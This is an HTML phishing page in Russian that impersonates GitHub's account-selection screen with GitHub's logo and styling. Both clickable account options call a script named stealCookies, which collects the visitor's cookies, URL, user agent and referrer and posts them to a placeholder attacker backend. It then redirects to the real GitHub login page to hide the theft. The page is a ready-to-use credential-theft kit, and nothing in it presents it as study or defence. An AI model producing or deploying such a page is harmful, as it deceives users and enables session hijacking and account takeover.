<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Выберите аккаунт — GitHub</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            background: #0d1117; color: #c9d1d9;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh;
        }
        .container { width: 100%; max-width: 400px; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        .github-logo { width: 48px; height: 48px; fill: #fff; margin-bottom: 20px; }
        .header h1 { font-size: 24px; font-weight: 400; }
        .account-list { background: #161b22; border: 1px solid #30363d; border-radius: 6px; overflow: hidden; }
        .account-item {
            display: flex; align-items: center; padding: 16px;
            border-bottom: 1px solid #30363d; cursor: pointer; transition: background 0.2s;
        }
        .account-item:hover { background: #1c2128; }
        .avatar {
            width: 40px; height: 40px; border-radius: 50%; background: #6e40c9;
            display: flex; align-items: center; justify-content: center;
            font-weight: bold; color: #fff; margin-right: 12px;
        }
        .account-info { flex: 1; text-align: left; }
        .account-info .name { font-weight: 600; font-size: 14px; }
        .account-info .status { font-size: 12px; color: #8b949e; }
        .other-account {
            padding: 16px; text-align: left; border-top: 1px solid #30363d;
            font-size: 14px; color: #58a6ff; cursor: pointer;
        }
        .other-account:hover { background: #1c2128; }
        .footer { margin-top: 20px; text-align: center; font-size: 12px; color: #8b949e; line-height: 1.5; }
        .footer a { color: #58a6ff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <svg class="github-logo" viewBox="0 0 16 16" aria-hidden="true">
                <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
            </svg>
            <h1>Выберите аккаунт</h1>
            <p style="color: #8b949e; font-size: 14px; margin-top: 8px;">Переход в приложение "GitHub"</p>
        </div>

        <div class="account-list">
            <div class="account-item" onclick="stealCookies()">
                <div class="avatar">jg</div>
                <div class="account-info">
                    <div class="name">user</div>
                    <div class="status">Вы вышли из аккаунта</div>
                </div>
            </div>
            <div class="other-account" onclick="stealCookies()">
                Использовать другой аккаунт
            </div>
        </div>

        <div class="footer">
            Прежде чем начать работу с приложением "GitHub", вы можете ознакомиться с его <a href="#">политикой конфиденциальности</a> и <a href="#">условиями использования</a>.
        </div>
    </div>

    <script>
        async function stealCookies() {
            const cookies = document.cookie || '(no accessible cookies)';
            try {
                await fetch('https://your-backend-url.com/api/cookies', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        cookies,
                        url: window.location.href,
                        ua: navigator.userAgent,
                        referrer: document.referrer || 'direct'
                    })
                });
            } catch (e) {
                console.warn('send failed, redirecting');
            } finally {
                setTimeout(() => {
                    window.location.href = 'https://github.com/login';
                }, 800);
            }
        }
    </script>
</body>
</html>
